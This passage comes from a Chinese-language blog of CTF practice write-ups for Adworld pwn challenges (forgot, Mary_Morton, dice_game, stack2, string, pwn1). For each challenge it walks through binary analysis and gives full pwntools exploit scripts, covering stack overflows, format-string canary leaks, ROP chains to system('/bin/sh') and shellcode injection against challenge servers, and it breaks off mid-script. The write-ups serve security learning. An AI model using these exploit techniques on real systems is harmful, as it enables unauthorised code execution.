class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;50628&#x27;</span>)<br><br>sys_addr=elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]   <span class="hljs-comment">#获取system的地址</span><br>name_addr=<span class="hljs-number">0x804a080</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;please tell me your name\n&quot;</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)   <span class="hljs-comment">#将/bin/sh写入name</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x26</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(sys_addr)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(name_addr)     <span class="hljs-comment">#32位的程序rop链构造，name中存放的数据作为system的参数</span><br>p.sendlineafter(<span class="hljs-string">&quot;hello,you can leave some message here:\n&quot;</span>,payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="攻防世界-pwn-forgot-栈溢出"><a class="markdownIt-Anchor" href="#攻防世界-pwn-forgot-栈溢出"></a> 攻防世界 pwn-forgot-栈溢出</h1><ol><li>先检查程序，发现只开启了nx保护</li></ol><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103114866.png" alt="image-20210413103114866"></p><ol start="2"><li>观察函数发现scanf函数存在栈溢出。</li></ol><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103154789.png" alt="image-20210413103154789"></p><p>再次观察其他函数发现存在一个后门函数可以直接拿到flag</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103221109.png" alt="image-20210413103221109"></p><p>先使用gdb进行调试，随便输入一些数据，发现最后返回的在ida里地址为0x80486CC的函数，在主函数中定义为v4</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103238325.png" alt="image-20210413103238325"></p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103251099.png" alt="image-20210413103251099"></p><p>观察ida里其他函数，发现一个后门函数，地址为0x80486CC考虑使用栈溢出去执行它</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103303074.png" alt="image-20210413103303074"></p><p>在ida中查看栈空间可知，v4函数距离scantf输入的变量v2的偏移量为0x24</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103429828.png" alt="image-20210413103429828"></p><p>编写payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>, <span class="hljs-number">33397</span>)<br>backaddr=<span class="hljs-number">0x80486CC</span>     <span class="hljs-comment">#后门函数地址</span><br>p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;text&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x24</span>+p32(backaddr)     <span class="hljs-comment">#覆盖v4的地址为后门函数</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="攻防世界-pwn-mary_morton-格式化字符串泄露canary"><a class="markdownIt-Anchor" href="#攻防世界-pwn-mary_morton-格式化字符串泄露canary"></a> 攻防世界 pwn-Mary_Morton-格式化字符串泄露canary</h1><ol><li>先查看程序，发现没有开启地址随机化</li></ol><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103823331.png" alt="image-20210413103823331"></p><ol start="2"><li>进行调试，发现程序让你会让你选择漏洞</li></ol><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103844363.png" alt="image-20210413103844363"></p><ol start="3"><li>用ida打开程序，发现在选择格式化字符串（2）的时候会调用一个printf函数，存在格式化字符串漏洞</li></ol><p>主函数</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103904120.png" alt="image-20210413103904120"></p><p>函数sub_4008EB</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103919834.png" alt="image-20210413103919834"></p><p>由于程序开启了canary保护，所以得先通过格式化字符串泄露出canary的值，才能覆盖返回地址达到开启后门函数的目的。</p><p>查看栈空间，发现canary的值距离buf的位置是0x90-0x8=0x88，该程序是64位程序，一个格式化字符串占8字节，0x88/8=17，再通过格式化字符串判断偏移量</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103935012.png" alt="image-20210413103935012"></p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103953632.png" alt="image-20210413103953632"></p><p>4.测试字符串的偏移，输入aaaa %p %p %p %p %p %p %p %p %p</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104113264.png" alt="image-20210413104113264"></p><p>根据回显可以知道偏移为6所以buf到var_8偏移为17+6=23</p><p>5.观察其他函数，发现有一个后门函数可以得到flag，地址为0x4008DA</p><p>​     <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104124884.png" alt="image-20210413104124884"></p><p>6.思路为先通过格式化字符串得到canary的值，然后再通过栈溢出去执行后门函数，得到flag，所以编写payload为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.binary=<span class="hljs-string">&#x27;Mary_Morton&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#io=process(&#x27;./Mary_Morton&#x27;)</span><br>io = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>, <span class="hljs-number">45232</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>io.recvuntil(<span class="hljs-string">&quot;3. Exit the battle \n&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>catflag=<span class="hljs-number">0x4008DA</span>        <span class="hljs-comment">#后门函数的地址</span><br>payload = <span class="hljs-string">&quot;%23$p&quot;</span>       <span class="hljs-comment">#buf距离canary值的偏移为23</span><br>io.sendline(payload)<br>Canary=<span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">&quot;00&quot;</span>),<span class="hljs-number">16</span>)   <span class="hljs-comment">#得到canary的值</span><br>log.info(<span class="hljs-string">&quot;Canary:&quot;</span>+<span class="hljs-built_in">hex</span>(Canary))<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x88</span>+p64(Canary)+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span>+p64(catflag)<br>io.send(payload)<br><span class="hljs-built_in">print</span> io.recvall()<br></code></pre></td></tr></table></figure><h1 id="攻防世界-pwn-dice_game"><a class="markdownIt-Anchor" href="#攻防世界-pwn-dice_game"></a> 攻防世界 pwn-dice_game</h1><p>1.先检查程序有没有存在栈溢出</p><p>​        <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104229973.png" alt="image-20210413104229973"></p><p>发现不存在canary保护，可能进行栈溢出的操作。</p><p>2.使用ida进行分析</p><p>主函数：</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104245282.png" alt="image-20210413104245282"></p><p>sub_A20()函数</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104308863.png" alt="image-20210413104308863"></p><p>经过分析可知，该程序的目的是对比输入的数字与随机生成的种子seed[]生成的随机数对6求余再加1进行对比，如果正确50次则通过。</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104331604.png" alt="image-20210413104331604"></p><p>通过查看地址可以知道当输入名字buf时，可以通过偏移覆盖到seed，偏移量为0x40</p><p>注：关于rand()和srand()随机函数:这两个函数生成的随机数实际上是一段数字的循环，这些数字取决于随机种子。在调用rand（）函数时，必须先利用srand()设好的随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。</p><p>所以只要控制随机数生成的种子seed，就可以预测生成的随机数，需要利用题目提供的库libc.so.6</p><p>Payload脚本</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/C:%5CUsers%5C17473%5CDesktop%5C%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C%5Cmakedown%5Cimage-20210413104657091.png" alt="image-20210413104657091"></p><h1 id="攻防世界-pwn-stack2"><a class="markdownIt-Anchor" href="#攻防世界-pwn-stack2"></a> 攻防世界 pwn-stack2</h1><p>1.先检查程序的保护</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105116926.png" alt="image-20210413105116926"></p><p>发现程序没有开启地址随机化，但是开启了canary保护</p><p>2.用ida观察函数，发现其中存在数组越界导致的栈溢出。</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/12.png" alt="12" style="zoom:67%;"><p>其中v5,v7都是我们可输入的数值，但是在赋值给数组时没有检查数组越界而导致了栈溢出</p><p>3.使用gdb进行动态调试，在存在该漏洞的函数下设置断点。</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105310409.png" alt="image-20210413105310409" style="zoom:67%;"><p>设置断点为0x8048839观察函数的偏移量。</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105330148.png" alt="image-20210413105330148" style="zoom:67%;"><p>函数的返回地址为0xf7e1d637</p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105439298.png" alt="image-20210413105439298" style="zoom:67%;"> <p>查看当我们更改已经数组里的数字时的栈空间</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105513866.png" alt="image-20210413105513866" style="zoom:67%;"><p>经过检验和计算得到的偏移量为0x84</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/11.png" alt="11"></p><p>4.用ida查看发现存在后门函数hackhere，地址为0x0804859B</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105759309.png" alt="image-20210413105759309" style="zoom:67%;"><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105829019.png" alt="image-20210413105829019" style="zoom:67%;"><p>5．先写出payload脚本将函数的返回地址覆盖为hackhere的函数地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>g_local=<span class="hljs-number">0</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>hackhere = <span class="hljs-number">0x0804859b</span><br>leave_offset = <span class="hljs-number">0x84</span>    <span class="hljs-comment">#偏移量</span><br>p = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>, <span class="hljs-number">58555</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">writebyte</span>(<span class="hljs-params">offset,value</span>):</span>    <span class="hljs-comment">#构造一个函数，方便修改栈里的地址</span><br>  p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>  p.recvuntil(<span class="hljs-string">&quot;which number to change:&quot;</span>)<br>  p.sendline(<span class="hljs-built_in">str</span>(offset))           <br>  p.recvuntil(<span class="hljs-string">&quot;new number:&quot;</span>)<br>  p.sendline(<span class="hljs-built_in">str</span>(value))      <span class="hljs-comment">#利用数组越界修改栈中存放的函数返回值地址</span><br><span class="hljs-comment">##def writedword()</span><br>p.recvuntil(<span class="hljs-string">&quot;How many numbers you have:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Give me your numbers&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;10&#x27;</span>)<br>writebyte(leave_offset,<span class="hljs-number">0x9b</span>)         <span class="hljs-comment">#题目是32位系统，小端序，高位地址存放在高位，依次写入hackhere的地址</span><br>writebyte(leave_offset+<span class="hljs-number">1</span>,<span class="hljs-number">0x85</span>)<br>writebyte(leave_offset+<span class="hljs-number">2</span>,<span class="hljs-number">0x04</span>)<br>writebyte(leave_offset+<span class="hljs-number">3</span>,<span class="hljs-number">0x08</span>)<br>p.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><p>运行之后发现hackhere函数提供的参数并不能拿到sh</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413110309852.png" alt="image-20210413110309852"></p><p>此时只能构造ROP链将system函数的参数修改为/sh</p><p>首先查询system的plt表地址</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413110412418.png" alt="image-20210413110412418" style="zoom:67%;"><p>可以看到system的plt表地址为0x08048450</p><p>然后查询参数sh的地址</p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413110506599.png" alt="image-20210413110506599" style="zoom: 80%;"><p>参数sh的地址为0x08048987</p><p>修改payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>g_local=<span class="hljs-number">0</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>hackhere = <span class="hljs-number">0x0804859b</span><br>sh = <span class="hljs-number">0x08048987</span><br>system =<span class="hljs-number">0x08048450</span><br>leave_offset = <span class="hljs-number">0x84</span>    <span class="hljs-comment">#偏移量</span><br>p = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>, <span class="hljs-number">59553</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">writebyte</span>(<span class="hljs-params">offset,value</span>):</span>    <span class="hljs-comment">#构造一个函数，方便修改栈里的地址</span><br>  p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>  p.recvuntil(<span class="hljs-string">&quot;which number to change:&quot;</span>)<br>  p.sendline(<span class="hljs-built_in">str</span>(offset))           <br>  p.recvuntil(<span class="hljs-string">&quot;new number:&quot;</span>)<br>  p.sendline(<span class="hljs-built_in">str</span>(value))      <span class="hljs-comment">#利用数组越界修改栈中存放的函数返回值地址</span><br><br>p.recvuntil(<span class="hljs-string">&quot;How many numbers you have:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Give me your numbers&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;10&#x27;</span>)<br>writebyte(leave_offset,<span class="hljs-number">0x50</span>)         <span class="hljs-comment">#题目是32位系统，小端序，高位地址存放在高位</span><br>writebyte(leave_offset+<span class="hljs-number">1</span>,<span class="hljs-number">0x84</span>)       <span class="hljs-comment">#先写入system的plt表地址</span><br>writebyte(leave_offset+<span class="hljs-number">2</span>,<span class="hljs-number">0x04</span>)<br>writebyte(leave_offset+<span class="hljs-number">3</span>,<span class="hljs-number">0x08</span>)<br>leave_offset+=<span class="hljs-number">8</span>                        <span class="hljs-comment">#跳过ebp</span><br>writebyte(leave_offset,<span class="hljs-number">0x87</span>)         <span class="hljs-comment">#题目是32位系统，小端序，高位地址存放在高位</span><br>writebyte(leave_offset+<span class="hljs-number">1</span>,<span class="hljs-number">0x89</span>)       <span class="hljs-comment">#写入参数sh</span><br>writebyte(leave_offset+<span class="hljs-number">2</span>,<span class="hljs-number">0x04</span>)<br>writebyte(leave_offset+<span class="hljs-number">3</span>,<span class="hljs-number">0x08</span>)<br>p.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="攻防世界-pwn-string-格式化字符串"><a class="markdownIt-Anchor" href="#攻防世界-pwn-string-格式化字符串"></a> 攻防世界-pwn-string-格式化字符串</h1><p>1.首先检查程序保护，发现保护除了PIE都开启了</p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113058130.png" alt="image-20210413113058130" style="zoom:67%;">                               <p>2.用ida打开并分析函数</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113119231.png" alt="image-20210413113119231" style="zoom:67%;"><p>主函数首先会打印出v4存储的值以及v4+4然后执行sub_400D72(v4)</p><p>下面是sub_400D72(v4)</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113159566.png" alt="image-20210413113159566" style="zoom:67%;"><p>先执行的是sub_400A7D()下图是sub_400A7D()，只能知道当显示So, where you will go?:时我们得输入east才能继续执行下去</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113242197.png" alt="image-20210413113242197" style="zoom:67%;"><p>再继续观察，发现sub_400CA6(a1)这个函数里有这样一段，如果a1数组的第一个数等于第二个数，那么可以执行外部命令（查找发现这个函数是可以执行shellcode的），传过来的a1数组就是开始的v3数组</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113307543.png" alt="image-20210413113307543" style="zoom:67%;"><p>然后在sub_400BB9()存在一处格式化字符串漏洞，由之前主函数可以知道v3的第一个数是68，v3[1]是85，要用格式化字符串漏洞让这两个数相等</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113331447.png" alt="image-20210413113331447" style="zoom:67%;"><p>在And, you wish is:输入1，Your wish is输入aaaa.%x.%x.%x.%x.%x.%x.%x.%x.%x查看输出，可以知道之前输入的1在第七个位置是格式化字符串的第七个参数</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113404697.png" alt="image-20210413113404697" style="zoom:67%;"><p>由于之前输出的secret[0]就是v3第一个数的地址，所以只要用格式化字符串漏洞修改其为85即可，然后输入shellcode（可以使用pwn库的函数自动生成）</p><p>所以可以构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>* <br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;48916&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;secret[0] is &#x27;</span>)<br>v3_addr=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">7</span>),<span class="hljs-number">16</span>) <span class="hljs-comment">#接收v3的地址</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;What should your character&#x27;s name be:\n&quot;</span>,<span class="hljs-string">&quot;abab&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;So, where you will go?east or up?:\n&quot;</span>,<span class="hljs-string">&quot;east&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;go into there(1), or leave(0)?:\n&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;\&#x27;Give me an address\&#x27;\n&quot;</span>,<span class="hljs-built_in">str</span>(v3_addr)) <span class="hljs-comment">#第一次发送v3的地址</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">85</span>+<span class="hljs-string">&#x27;%7$n&#x27;</span>   <span class="hljs-comment">#偏移为7，将v3的地址的位置的参数改为85</span><br>p.recvuntil(<span class="hljs-string">&#x27;And, you wish is:/n&#x27;</span>)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;I will help you! USE YOU SPELL\n&#x27;</span>)<br>p.sendline(asm(shellcraft.amd64.linux.sh(),arch=<span class="hljs-string">&quot;amd64&quot;</span>))  <span class="hljs-comment">#发送调用/bin/sh的sellcode</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="攻防世界-pwn-pwn1-构造rop链泄露put的真实地址"><a class="markdownIt-Anchor" href="#攻防世界-pwn-pwn1-构造rop链泄露put的真实地址"></a> 攻防世界-pwn-pwn1-构造rop链泄露put的真实地址</h1><ol><li>先检查文件属性</li></ol><p>​    <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113958358.png" alt="image-20210413113958358" style="zoom:67%;"></p><p>该程序是64位程序，发现保护已经开的很全了</p><p>2.用ida观察主函数，发现有个read函数和puts函数可以进行栈溢出</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114030279.png" alt="image-20210413114030279" style="zoom:67%;"><p>3.观察栈结构，字符串s距离canary的值的偏移为0x90-0x8=0x88</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114130145.png" alt="image-20210413114130145"></p><p>所以可以通过put函数将canary显示出来，由于put函数遇到\00会停止输出，调试可以知道，当我们输入a*0x88后再输入回车时，回车的\0A会覆盖掉canary末尾的\00这时就可以输出canary</p><p>输入a*0x88不输入\n时的内存数据</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114203956.png" alt="image-20210413114203956" style="zoom:67%;"><p>Canary的值应该是0x7c5ddb9e9a8a7d00，但是继续运行程序选择“2“调用put函数时不输出canary的值。</p><p>输入’0x88’*a+’\n’的内存空间</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114238047.png" alt="image-20210413114238047" style="zoom:67%;"><p>这时可以正常输出canary的值了，但是末尾的\00会变成\0a，所以接受时要把末尾的\0a修改为\00</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114309571.png" alt="image-20210413114309571"></p><p>4.题目给了一个动态链接库，所以我们可以在里面寻找到execve(&quot;/bin/sh&quot;)的地址</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114328650.png" alt="image-20210413114328650" style="zoom:67%;"><p>随便选择一个0x45216，此题开启了地址随机化，如果想要通过栈溢出运行execve(&quot;/bin/sh&quot;)，就得泄露内存中的基址</p><p>5.利用put()函数泄露put()的真实地址，由于是64位程序，首先找到一个pop_rdi,查找可知地址为0x400a93</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114404796.png" alt="image-20210413114404796" style="zoom:67%;"><p>64位程序泄露put()真实地址的方式为：p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)，泄露之后就可以使用</p><p>由此可以编写payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 